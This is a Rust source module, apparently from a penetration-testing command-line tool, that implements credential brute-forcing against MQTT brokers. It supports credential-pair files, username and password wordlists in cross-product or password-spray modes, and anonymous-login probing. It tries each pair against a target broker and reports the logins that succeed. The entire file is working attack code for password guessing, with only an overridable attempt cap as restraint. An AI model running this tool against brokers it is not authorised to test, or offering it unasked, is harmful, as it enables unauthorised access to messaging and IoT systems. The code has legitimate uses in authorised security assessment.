use crate::mqtt::client::{build_options, ConnectionArgs};
use anyhow::{bail, Context, Result};
use clap::Args;
use rumqttc::{AsyncClient, ConnectReturnCode, ConnectionError, Event, Packet};
use std::fs::File;
use std::io::{BufRead, BufReader};
use tokio::time::{sleep, Duration};

/// Safety cap for cross-product mode; override with --force.
const CROSS_PRODUCT_CAP: usize = 10_000;

#[derive(Debug)]
enum AuthResult {
    Success,
    Failed(String),
    Timeout,
    Error(String),
}

struct Attempt {
    username: Option<String>,
    password: Option<String>,
}

impl Attempt {
    fn label(&self) -> String {
        match (&self.username, &self.password) {
            (None, _) => "(anonymous)".into(),
            (Some(u), None) => format!("{}:(none)", u),
            (Some(u), Some(p)) => {
                let s = format!("{}:{}", u, p);
                if s.len() > 52 {
                    format!("{} ...", &s[..51])
                } else {
                    s
                }
            }
        }
    }
}

#[derive(Args, Debug)]
pub struct BruteAuthArgs {
    #[command(flatten)]
    pub connection: ConnectionArgs,

    /// Credential pairs file (username:password per line; # comments and blank lines ignored)
    #[arg(short = 'c', long)]
    pub credentials: Option<String>,

    /// Username wordlist; combine with --pass-list for cross-product or -P for spray
    #[arg(short = 'U', long)]
    pub user_list: Option<String>,

    /// Password wordlist; combine with --user-list or -u for single-user brute-force
    #[arg(short = 'W', long)]
    pub pass_list: Option<String>,

    /// Test an anonymous (no credentials) connection before the wordlist
    #[arg(long)]
    pub try_anonymous: bool,

    /// Stop after the first successful login
    #[arg(long)]
    pub stop_on_success: bool,

    /// Milliseconds between attempts
    #[arg(long, default_value_t = 0)]
    pub delay: u64,

    /// Seconds to wait for a broker response per attempt
    #[arg(long, default_value_t = 5)]
    pub timeout: u64,

    /// Override the cross-product candidate count safety cap
    #[arg(long)]
    pub force: bool,
}

pub async fn run(args: BruteAuthArgs) -> Result<()> {
    let mut attempts = build_attempts(&args)?;

    if args.try_anonymous {
        attempts.insert(0, Attempt { username: None, password: None });
    }

    if attempts.is_empty() {
        bail!("no credentials to test");
    }

    eprintln!(
        "[*] Target  : {}:{}",
        args.connection.host, args.connection.port
    );
    eprintln!("[*] Attempts: {}", attempts.len());
    if args.stop_on_success {
        eprintln!("[*] Mode    : stop on first success");
    }
    eprintln!("[*] Delay   : {}ms between attempts\n", args.delay);

    let total = attempts.len();
    let width = total.to_string().len();
    let mut found: Vec<String> = Vec::new();

    for (i, attempt) in attempts.iter().enumerate() {
        let mut conn = args.connection.clone();
        conn.username = attempt.username.clone();
        conn.password = attempt.password.clone();

        let result = try_credentials(conn, args.timeout).await;

        let label = attempt.label();
        match &result {
            AuthResult::Success => {
                eprintln!("[{:>w$}/{}] {:<54} SUCCESS", i + 1, total, label, w = width);
                found.push(label);
                if args.stop_on_success {
                    break;
                }
            }
            AuthResult::Failed(reason) => {
                eprintln!(
                    "[{:>w$}/{}] {:<54} failed ({})",
                    i + 1, total, label, reason, w = width
                );
            }
            AuthResult::Timeout => {
                eprintln!("[{:>w$}/{}] {:<54} timeout", i + 1, total, label, w = width);
            }
            AuthResult::Error(e) => {
                eprintln!("[{:>w$}/{}] {:<54} error: {}", i + 1, total, label, e, w = width);
            }
        }

        if args.delay > 0 && i + 1 < total {
            sleep(Duration::from_millis(args.delay)).await;
        }
    }

    println!();
    if found.is_empty() {
        println!("[-] No valid credentials found.");
    } else {
        println!("[+] Valid credential(s) found:");
        for c in &found {
            println!("    {}", c);
        }
    }

    Ok(())
}

/// Try one username/password pair and return the broker's verdict.
/// A refused ConnAck surfaces as Err(ConnectionError::ConnectionRefused) in rumqttc.
async fn try_credentials(conn: ConnectionArgs, timeout_secs: u64) -> AuthResult {
    let opts = match build_options(&conn) {
        Ok(o) => o,
        Err(e) => return AuthResult::Error(e.to_string()),
    };
    let (_client, mut eventloop) = AsyncClient::new(opts, 16);

    let result = tokio::time::timeout(Duration::from_secs(timeout_secs), async move {
        loop {
            match eventloop.poll().await {
                Ok(Event::Incoming(Packet::ConnAck(_))) => return AuthResult::Success,
                Ok(_) => {}
                Err(ConnectionError::ConnectionRefused(code)) => {
                    return match code {
                        ConnectReturnCode::BadUserNamePassword => {
                            AuthResult::Failed("bad credentials".into())
                        }
                        ConnectReturnCode::NotAuthorized => {
                            AuthResult::Failed("not authorized".into())
                        }
                        other => AuthResult::Failed(format!("{:?}", other)),
                    };
                }
                Err(e) => return AuthResult::Error(e.to_string()),
            }
        }
    })
    .await;

    match result {
        Ok(r) => r,
        Err(_) => AuthResult::Timeout,
    }
}

/// Build the ordered list of attempts from whichever input mode was chosen.
fn build_attempts(args: &BruteAuthArgs) -> Result<Vec<Attempt>> {
    // Validate: at least one input source must be provided.
    let have_creds   = args.credentials.is_some();
    let have_ulist   = args.user_list.is_some();
    let have_wlist   = args.pass_list.is_some();
    let have_user    = args.connection.username.is_some();
    let have_pass    = args.connection.password.is_some();

    if !have_creds && !have_ulist && !have_wlist && !have_user && !have_pass && !args.try_anonymous {
        bail!(
            "specify an input source:\n  \
             -c FILE           credential pairs\n  \
             -U FILE -W FILE   cross-product brute-force\n  \
             -u USER -W FILE   single-user brute-force\n  \
             -U FILE -P PASS   password spray\n  \
             --try-anonymous   anonymous-only probe"
        );
    }

    if have_creds && (have_ulist || have_wlist) {
        bail!("--credentials cannot be combined with --user-list / --pass-list");
    }

    // Mode 1: credential pairs file.
    if let Some(path) = &args.credentials {
        return load_credential_pairs(path);
    }

    // Resolve username source: --user-list takes priority over -u.
    let usernames: Vec<Option<String>> = if let Some(path) = &args.user_list {
        load_wordlist(path)?.into_iter().map(Some).collect()
    } else if let Some(u) = &args.connection.username {
        vec![Some(u.clone())]
    } else if have_wlist || have_pass {
        bail!("--pass-list / -P requires -u <USERNAME> or --user-list <FILE>");
    } else {
        vec![]
    };

    // Resolve password source: --pass-list takes priority over -P.
    let passwords: Vec<Option<String>> = if let Some(path) = &args.pass_list {
        load_wordlist(path)?.into_iter().map(Some).collect()
    } else if let Some(p) = &args.connection.password {
        vec![Some(p.clone())]
    } else {
        vec![None] // try with no password
    };

    // Cross-product safety cap (only relevant when both lists are non-trivial).
    let total = usernames.len().saturating_mul(passwords.len());
    if total > CROSS_PRODUCT_CAP && !args.force {
        bail!(
            "cross-product would generate {} attempts (safety cap: {}). \
             Reduce the wordlists or pass --force to override.",
            total, CROSS_PRODUCT_CAP
        );
    }

    let attempts = usernames
        .into_iter()
        .flat_map(|u| {
            passwords.iter().map(move |p| Attempt {
                username: u.clone(),
                password: p.clone(),
            })
        })
        .collect();

    Ok(attempts)
}

fn load_credential_pairs(path: &str) -> Result<Vec<Attempt>> {
    let file = File::open(path).with_context(|| format!("cannot open credentials file '{}'", path))?;
    let mut out = Vec::new();
    for line in BufReader::new(file).lines() {
        let line = line.with_context(|| format!("error reading '{}'", path))?;
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (username, password) = match line.find(':') {
            Some(i) => {
                let pw = &line[i + 1..];
                (line[..i].to_owned(), if pw.is_empty() { None } else { Some(pw.to_owned()) })
            }
            None => (line.to_owned(), None),
        };
        if username.is_empty() {
            continue;
        }
        out.push(Attempt { username: Some(username), password });
    }
    Ok(out)
}

fn load_wordlist(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).with_context(|| format!("cannot open wordlist '{}'", path))?;
    let lines: std::io::Result<Vec<_>> = BufReader::new(file)
        .lines()
        .filter(|l| l.as_ref().map(|s| !s.trim().is_empty()).unwrap_or(true))
        .collect();
    lines.with_context(|| format!("error reading wordlist '{}'", path))
}
